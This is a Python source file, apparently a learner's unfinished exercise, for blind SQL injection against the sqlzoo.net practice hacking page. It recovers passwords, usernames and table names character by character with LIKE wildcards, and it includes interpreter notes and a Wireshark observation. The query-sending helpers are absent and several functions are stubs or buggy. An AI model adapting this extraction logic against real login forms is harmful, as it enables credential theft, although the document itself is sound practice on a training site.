import itertools

# https://stackoverflow.com/questions/54621596/include-both-single-quote-and-double-quote-in-python-string-variable
# https://stackoverflow.com/questions/54620287/how-to-include-both-single-and-double-quotes-in-the-same-string-variable-in-pyth
# special = {|}~[\]^_`!"#$%&'()*+,-./:;<=>?@)
# so use .join or """ i guess?
# special = ''.join("{|}~[\]^`!#$&'()*+,-./:;<=>?@)") + '"'
special = " ".join("{|}~[\]^`!#$&()*+,-./:;<=>?@)").split()
special.append(" ")
lower = " ".join("abcdefghijklmnopqrstuvwxyz").split()
upper = " ".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ").split()
numbers = " ".join("0123456789").split()

# lower = [ "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" ]
# upper = [ "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ]
# numbers = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" ]
# special = [ "{", "|", "}", "~", "[", "\", "]", "^", "`", "!", '#', '$', '&', "'", " ", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?", "@", ")", """, ")", "+", '"' ]

# https://stackoverflow.com/questions/28056843/special-characters-in-string-literals#28056873
other = []
wildcards = ["_", "%"]


def assignCharacters(otherChars, where):
   """makes variables for subsets of the unicode char sets
   
   Args:
      otherChars: string or list
         additional characters to concatenate with the variable where
      where: variable -- string or list
         which variable to concatenate with otherChars
   
   Returns: 
      where:
         where concatenated with otherChars
   
   """
   if(isinstance(otherChars, list)):
       where.append(otherChars)
   if(isinstance(otherChars, str)):
       tmp = " ".join(otherChars).split()
       where.append(tmp)


       
#   return where
   
# Type checking:   
# https://stackoverflow.com/questions/1835018/how-to-check-if-an-object-is-a-list-or-tuple-but-not-string#1835044
# https://stackoverflow.com/questions/26544091/checking-if-type-list-in-python

# Global Variables:
# https://stackoverflow.com/questions/423379/using-global-variables-in-a-function
# Unbound Local Error:
# https://stackoverflow.com/questions/9264763/dont-understand-why-unboundlocalerror-occurs
# Variable Scope:
# https://stackoverflow.com/questions/370357/python-variable-scope-error



def makeList(username, url, caseSensitive = False, wildCards = True):
   """checks for common characters in the password and returns the characters contained somewhere in the password string

   characters: a-z 0-9 "{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)
      if caseSensitive = True: A-Z
   
   Args:
      username: string
         valid username to check password
      url: string
         url to form to check
      caseSensitive: boolean (optional)
         Set to true to check uppercase and lowercase versions of the characters
      wildCards: boolean (optional)
         default true
         Set to false to disallow wildcards -- not currently recommended, may cause unexpected code failures

   Returns:
      charList:
         list of the characters in the password. 
         
         Note: also returned _ and %. Took those characters out of the character set for now. Add em back later:
         https://stackoverflow.com/questions/8764370/escaping-special-characters-in-sql
         https://www.techonthenet.com/sql/like.php

   """
   charList = []
   for ch in lower:
      # check for ch in 
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in numbers:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in special:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in other:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   if(caseSensitive):
      for ch in upper:
         if(checkPasswordCharacter(str(ch), username, url)):
            charList.append(str(ch))
            print(ch)
   if(wildCards):
      for ch in wildcards:
         if(checkPasswordCharacter(str(ch), username, url)):
            charList.append(str(ch))
            print(ch)
   return charList



def checkPass(username, url, charList, n):
   """checks for a character in position i, and records it when the character at postion i was found.
      
      Args:
         username:

         url:

         charList: list of valid characters from the password

         n: integer
            max size of passwords to check. will stop checking and return current progress if n < len(password)

      Returns:
         i: integer
            prints i iff there is no character in charList that matches at position i. also raises type and value error after printing i -- printing is handled by findChar
         password: string
            correct password or, if len(password) = n, first n characters of password
            if no characters match and wildcards are in the charList (wildCards is True), _ will be substituted in since it matches every single character.
            otherwise, if no characters match, that character will be skipped, and it's index is printed (e.g. Missing: 6) 

      Raises:
         TypeError: exception
            raised with ValueErrors when findChar returns i instead of an element of CharList
         ValueError: exception 
            raised when no character in charList is correct.

   https://stackoverflow.com/questions/2052390/manually-raising-throwing-an-exception-in-python
   
   Note: not working as hoped. Perhaps I need to change the other functions to always return a str? Maybe a place holder string like _ for now? 

   """
   # dikt = {}
   password = ""
   for i in range(0, n):
      if(testPassword(password, username, url)):
         return password #password is found!       
       # https://stackoverflow.com/questions/189645/how-to-break-out-of-multiple-loops-in-python
      ch = findChar(username, url, charList, i)
      # if(isinstance(ch, int))#if ch is int i, can't find a matching character at index i in password string 
      # use try except instead of if(isinstance(ch, int)):
      # https://stackoverflow.com/questions/3501382/checking-whether-a-variable-is-an-integer-or-not
      try: 
         password += ch
      except TypeError:
         # print(i)
         password += str(ch) #should be blank
         # raise ValueError("index i has no matching character")
   return password #only reached if password is too long for the given n


def findChar(username, url, charList, i):
   """helper function for checkPass
   returns the first element of charList found that works for the password at index i
   if it fails to find a character at i, prints i and returns an empty string instead of returning i.
   """
   for ch in charList:
         if(checkPasswordCharacter(ch, username, url, index = i)):
            return ch
   #only runs if no ch in charList match:
   # return i #oof, there's no match if i is out of bounds, e.g. len(password) < i
   print("Missing: " + i) #so I know when it's not a match
   return "" #return an empty string instead
   # Note to self: should not return an _ because it'll match an _ if wildCards are true (default). 
   # If wildCards is false, this will just skip characters that don't match anything!

"""
   Strategy:
   
   if findChar returns i -  meaning checkPass will print i then raise a type and a value error -
   then perhaps check all unicode characters for the password at index i and add the one that works to the charaters checked and rerun the script
   
"""

def makeTableList(url, caseSensitive = False, wildCards = True):
   """ List of characters in table names
   
   Args:
      url: String
         form url
      caseSensitive: Boolean
         default False
         true if case sentitivity matters
      wildCards: Boolean
         default True
         true if wildcards should be placed where no other characters match

   Returns:
      lst: List
         list of characters in table names

   """
   charList = []
   for ch in lower:
      # ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   for ch in numbers:
      ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   for ch in special:
      ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   for ch in other:
      ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   if(caseSensitive):
      for ch in upper:
         # ch = str(ch)
         if(characterInTableName(ch, url)):
            charList.append(ch, url)
   if(wildCards):
      for ch in wildCards:
         # ch = str(ch)
         if(characterInTableName(ch, url)):
            charList.append(ch, url)
   return charList


def makeDatabaseList():
   """ List of characters in database names

   Args:
      url: String
         form url
      caseSensitive: Boolean
         default False
         true if case sentitivity matters
      wildCards: Boolean
         default True
         true if wildcards should be placed where no other characters match

   Returns:
      lst: List
         list of characters in table names

"""
   charList = []
   for ch in lower:
      # ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   for ch in numbers:
      ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   for ch in special:
      ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   for ch in other:
      ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   if(caseSensitive):
      for ch in upper:
         # ch = str(ch)
         if(characterInDatabaseName(ch, url)):
            charList.append(ch, url)
   if(wildCards):
      for ch in wildCards:
         # ch = str(ch)
         if(characterInDatabaseName(ch, url)):
            charList.append(ch, url)
   return charList

def makeTableNamesList(n, ):
   """ List of table names
   
   Args:
      n: integer
         max number of table names to return
      

   Returns:
      lst: list
         list of up to n table names
   """



def tableName(lst, ):

   name = ""
   for i in range(0, n):
      for ch in lst:
         if(characterInTableName(ch, url, i)):
            name += ch
         else:
            name += "" #should only be reached if wildcards are false

   return name

def makeDatabaseNamesList(n, ):
   """ List of database names
   
   Args:
      n: integer
         max number of table names to return
      

   Returns:
      lst: list
         list of up to n database names

"""

def makeListF(f, url, *argsf, caseSensitive = False, wildCards = True):
   """makeList generalized to use the boolean function f.

   Args:
      argsf: list
         sole list argument of the function f.
   Returns:
      lst: list of valid characters as determined by the boolean function f

   """

def userNameCharacters(url, tableName, caseSensitive = False, wildCards = True):
   """ returns list of characters that appear in any username
   

   """
   lst = []

   for ch in special:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   for ch in lower:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   for ch in numbers:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   for ch in other:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   if(caseSensitive):
      for ch in upper:
         if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
            lst.append(ch)
   if(wildCards):
      for ch in wildcards:
         lst.append(ch) #it'll match if there's users
   return lst

def userLists(n, tableName, url, characterList):

   """
   Assumption: usernames are unique. 

   Args:
      n: integer
         max password length
      tableName: string
         name of table with usernames
      url: string
         url of vulnerable form
      characterList:
         list of characters in one or more usernames

   Returns:
      lstNested: list of lists
         returns a list of up to n lists, each sublist i contatins characters
         from characterList that match at least one username at index i in the 
         username strings 
         (e.g. lst = [[a], [b,c], [d]] could correspond to a, ab, ac, abd, acd)

   Raises:


   """
   lstNested = []
   for i in range(0, n):
      lst = []
      for ch in characterList:
         if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = i)):
            lst.append(ch)
      if(len(lst) == 0 or lst[0] == "%"):
         break
      lstNested.append(lst)
   return lstNested

   """
   max(len(username)) is 9. So userLists(12, tab) returns a list with 9 lists (0-8) 
   matching letters, and both wildcards; the 9th matches only '%' 
   i.e. the 0 or more character wildcard and after that returns empty lists.
   This makes sense b/c as i increases, so does the number of single character matches increases. 
   So, for i = 2 there's "_" + ch
   So changing it to now check if the sublist has the zero or more character wildcard 
   character first or an empty list and breaking if either of those is found.
   Empty list would happen if wildcards were not included in the characterList
   """

def userNames(lst, url, tableName):
   """ returns a list of usernames

   Args:
      lst: nested list
         nested list. Intended to be userLists. 
      url: string
         url of vulnerable form
      tableName: string
         table with usernames



   """
   # https://docs.python.org/3/library/itertools.html#itertools.product
   # https://stackoverflow.com/questions/3034014/how-to-apply-itertools-product-to-elements-of-a-list-of-lists
   lst2 = list(itertools.product(*lst))
   lst3 =  list(map("".join, lst2))
   list(map(checkUsername())) 
   # still need a checkUsername function 
"""
   url = "https://sqlzoo.net/hack/passwd.pl"
tab = "users"
chList = userNameCharacters(url, tab)
lst = userLists(10, tab, url, chList)
   n = 1

   for i in lst:
       n *= len(i)

   n
Out[69]: 46656000

len(chList)
Out[72]: 16

   math.factorial(16)
Out[74]: 20922789888000

   math.factorial(16)/len(lst2)
Out[75]: 448448.0

   len(lst2)
Out[76]: 46656000

   so turns out this makes a REALLY large number of requests to send a server...
"""
"""
the pattern made by itertools.product:

lst
Out[78]: 
[['a',  'c',  'd',  'e',  'h',  'i',  'j',  'k',  'n',  'o',  'p',  'r',  't',  'w', '_',  '%'],
 ['a', 'c', 'd', 'e', 'h', 'i', 'k', 'n', 'o', 'p', 'r', 't', 'w', '_', '%'],
 ['a', 'c', 'd', 'e', 'h', 'i', 'k', 'n', 'p', 'w', '_', '%'],
 ['a', 'c', 'd', 'e', 'i', 'n', 'p', '_', '%'],
 ['e', 'i', 'n', 'p', '_', '%'],
 ['e', 'i', 'p', '_', '%'],
 ['e', 'i', 'p', '_', '%'],
 ['e', 'i', '_', '%'],
 ['e', '_', '%']]

for l in lst:
    print(len(l))
16
15
12
9
6
5
5
4
3

lst2[0]
Out[94]: ('a', 'a', 'a', 'a', 'e', 'e', 'e', 'e', 'e')

lst2[1]
Out[79]: ('a', 'a', 'a', 'a', 'e', 'e', 'e', 'e', '_')

lst2[3]
Out[80]: ('a', 'a', 'a', 'a', 'e', 'e', 'e', 'i', 'e')

lst2[12]
Out[81]: ('a', 'a', 'a', 'a', 'e', 'e', 'i', 'e', 'e')

lst2[60]
Out[82]: ('a', 'a', 'a', 'a', 'e', 'i', 'e', 'e', 'e')

lst2[60*5]
Out[83]: ('a', 'a', 'a', 'a', 'i', 'e', 'e', 'e', 'e')

lst2[60*5*6]
Out[84]: ('a', 'a', 'a', 'c', 'e', 'e', 'e', 'e', 'e')

lst2[60*5*6*9]
Out[85]: ('a', 'a', 'c', 'a', 'e', 'e', 'e', 'e', 'e')

lst2[60*5*6*9*12]
Out[86]: ('a', 'c', 'a', 'a', 'e', 'e', 'e', 'e', 'e')

lst2[60*5*6*9*12*15]
Out[87]: ('c', 'a', 'a', 'a', 'e', 'e', 'e', 'e', 'e')
"""


   """
   Strategy:
   first find the set of characters anywhere in any username. Pass this list to userLists.
   """

   """
   Strategy:
   
   set an n (max password length)
   
   iterate over character set n times, checking for character in positions 0 ... n -1.
   Stop iterating if only wildcards match (assumes all 
   wildcards means that I've exceeded the length of all
   passwords, not that the passwords are all wildcards) --- wait
   wouldn't nothing match in that case? Investigate! 

   return a list of lists with up to n lists! 
   This list can be used to find individual passwords!
   """

   """
   Strategy:
   Inputs: list of lists, n. n is the number of passwords to be found (nUsers can give the n for this).
   nested loops testing characters in this character set? This seems like a bad idea... 
   Scaling this leads to basically brute forcing the passwords with more programming logic...
   There must be a better way to do this but idk...
   Well maybe usernames tend to have patterns so this is still a useful reduction in the search space?
   Still would prefer a better way!
   """





"""
is sql case sensitive?

it can be:
https://stackoverflow.com/questions/3969059/sql-case-sensitive-string-compare

some commands to check and alter collation:
https://stackoverflow.com/questions/14962419/is-the-like-operator-case-sensitive-with-mssql-server
https://stackoverflow.com/questions/1411161/sql-server-check-case-sensitivity
https://stackoverflow.com/questions/1831105/how-to-do-a-case-sensitive-search-in-where-clause-im-using-sql-server

"""


"""
toDo
   
   continue implementing functions

   abstract repeated functions into seperate functions: 
   pass parts that don't repeat as functions, which are just regular parameters!!!
      e.g. makeList makeTableList and makeDatabaseList can be rewriten with a function f 
      replacing checkPasswordCharacter characterInTableName characterInDatabaseName 
      and those functions being passed as the parameter f
   https://stackoverflow.com/questions/1349332/python-passing-a-function-into-another-function#1349350

"""

"""
ran python script sending network data between linux machine and sqlzoo.net
opened wireshark and captured data
looked at traffic, found DNS request from 127.0.0.1 --> 127.0.0.53
that sqlzoo.net ip address is 146.176.166.58
visited in browser
found it's a related page that links to different projects
found it's by Dr Gordon Russell of Edinburgh Napier University
so sqlzoo hacking forum is by Gordon Russell, a cyber security prof from the UK
https://www.napier.ac.uk/people/gordon-russell
makes sense -- sqlzoo.net has a blurb about sqli being illegal under UK law
"""

